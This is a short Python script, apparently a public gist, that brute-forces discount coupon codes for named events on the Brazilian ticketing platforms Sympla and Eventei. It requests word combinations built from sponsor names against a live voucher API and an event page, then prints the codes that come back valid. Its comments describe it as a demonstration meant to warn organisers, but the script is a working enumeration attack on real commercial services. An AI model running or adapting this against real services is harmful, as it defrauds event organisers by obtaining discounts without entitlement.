#  Copyright (c) 2018-2020. Enderson Menezes Cândido [www.endersonmenezes.com.br]
#  Your console will display a list of available discount coupons.
#  Do not use this code to gain advantage or illegally enter the event.
#  Code just to demonstrate that creating discount coupons in sympla using simple word combinations can be hacked.
#  This gist serves to show how social engineering be taken care of by event organizations.
#  To event organizers please create discount coupon processes and tracking processes.
#  Working Since 2018

import requests
import itertools


URL_SYMPLA = 'https://www.sympla.com.br/ticnova-2019__594324?d='
URL_EVENTEI = 'http://eventei.com/details.html?event=2c0b6270-dc41-11ea-8598-f1bb3737cf34#ingressos'
SCRIPTMODE = 1  # Use 2 for Sympla


def transform_url_eventei(url_eventei):
    url_eventei = url_eventei.split('=')
    url_eventei = url_eventei[1]
    url_eventei = url_eventei.split('#')
    url_eventei = url_eventei[0]
    return 'https://enjoyleads-api.herokuapp.com/shopping/voucher/{}'.format(url_eventei)


def test_cupom_code_eventei(cupomcode):
    url_api_eventei = transform_url_eventei(URL_EVENTEI)
    url_api_eventei = '{}/{}'.format(url_api_eventei, cupomcode)
    req = requests.get(url_api_eventei).json()
    if 'active' in req.keys():
        if req['active']:
            print('Cupom Ativo | Cupom: {}'.format(cupomcode))


def test_cupom_code_sympla(cupomcode):
    url = '{}{}'.format(URL_SYMPLA, cupomcode)
    pagina = requests.get(str(url))
    descontoinvalido = pagina.text.find('Código inválido')
    if descontoinvalido == -1:
        print('Cupom Ativo | Cupom: {}'.format(cupomcode))


if __name__ == '__main__':
    # 2019 AND 2018
    # tentativasarray = ['TICNOVA', '2019', 'UNICESUMAR', 'SBM', 'CESUMAR', 'SOFTWAREBY', 'SOFTWAREBYMARINGA', 'ACCION',
    #                    'BUYSOFT', 'GETCARD', 'TECNOSPEED', 'ALUNO', 'BYTEABYTE', 'ACIM', 'SEBRAE']
    # Many websites and ecommerces use simple words for discounts, and have no security in the verification API.
    # So I recommend always taking great care with what will be used.
    # Muitos sites e ecommerces utilizam palavras simples para descontos, e não possuem segurança na API de verificação.
    # desses códigos. Por isso recomendo sempre tomar muito cuidado com o que vai ser utilizado.
    tentativasarray = ['TICNOVA', '2020', 'ACCION', 'ACIM', 'BUYSOFT', 'CBN', 'COCAMAR', 'COOPERCARD', 'COOPER',
                       'EVENTEI', 'GETCARD', 'RGK4IT', 'SEBRAE', 'SOFTWAREBY', 'MARINGA', 'TECNOSPEED', 'WIFIRE',
                       'BYTEABYTE']
    for tentativa in range(2, 5):
        tentativas_comb = itertools.product(tentativasarray, repeat=tentativa)
        for item in tentativas_comb:
            cupomcode = ''.join(item)
            if SCRIPTMODE == 1:
                test_cupom_code_eventei(cupomcode)
            elif SCRIPTMODE == 2:
                test_cupom_code_sympla(cupomcode)
            else:
                print('Configure o arquivo main.py')

